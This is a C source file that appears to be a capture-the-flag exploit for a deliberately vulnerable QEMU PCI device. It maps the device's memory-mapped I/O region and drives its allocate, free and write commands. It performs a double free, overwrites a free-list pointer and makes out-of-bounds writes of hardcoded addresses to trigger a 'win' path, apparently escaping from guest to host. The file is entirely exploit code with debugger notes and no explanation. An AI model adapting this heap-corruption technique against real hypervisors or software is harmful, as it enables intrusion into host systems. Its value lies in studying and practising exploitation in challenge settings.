#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>

void *iomem;

void iowrite(uint32_t offset, uint32_t val)
{
	*((uint32_t *)(iomem + offset)) = val;
}

void iowrite64(uint32_t offset, uint64_t val)
{
	*((uint64_t *)(iomem + offset)) = val;
}

// idx == 0xF => mallocs all indexes
void dev_malloc(uint8_t idx, uint32_t mul) 
{
  iowrite(0x000000 | (((uint32_t)idx) << 16), mul);
}

void dev_free(uint8_t idx) 
{
  iowrite(0x100000 | (((uint32_t)idx) << 16), 0);
}

void dev_write64(uint8_t i, uint16_t off, uint64_t value) 
{
  iowrite64(0x200000 | (((uint32_t)i) << 16) | off, value);
}

int main()
{
	// / # lspci
	// 00:00.0 Class 0600: 8086:1237
	// 00:01.0 Class 0601: 8086:7000
	// 00:01.1 Class 0101: 8086:7010
	// 00:01.3 Class 0680: 8086:7113
	// 00:02.0 Class 0300: 1234:1111
	// 00:03.0 Class 0200: 8086:100e
	// 00:04.0 Class 00ff: 0420:1337
	// / # ls -lh /sys/devices/pci0000\:00/0000\:00\:04.0/resource0
	// -rw-------    1 0        0          16.0M Dec 14 13:18 /sys/devices/pci0000:00/0000:00:04.0/resource0
	int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR);
	iomem = mmap(0, 16 * 1024 * 1024, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

	// pwndbg> telescope 0x1317a02
	// 00:0000│   0x1317a02 ◂— 0x66 /* 'f' */
	dev_malloc(0x0, 11);
	dev_malloc(0x1, 11);
	dev_free(0x0);
	dev_free(0x1);
	dev_free(0x0);
	puts("[+] cycled list.");

	dev_malloc(0x0, 11);
	dev_write64(0x0, 0, 0x1317a02-0x8);
	puts("[+] modified fd.");

	dev_malloc(0x0, 11);
	dev_malloc(0x0, 11);
	dev_malloc(0x1, 11);
	dev_write64(0x1, -202, 0x1130b78);
	dev_write64(0x0, 0, 0x6E65F9);

	puts("[*] trigger win.");
	dev_malloc(0x0, 0x0);

}
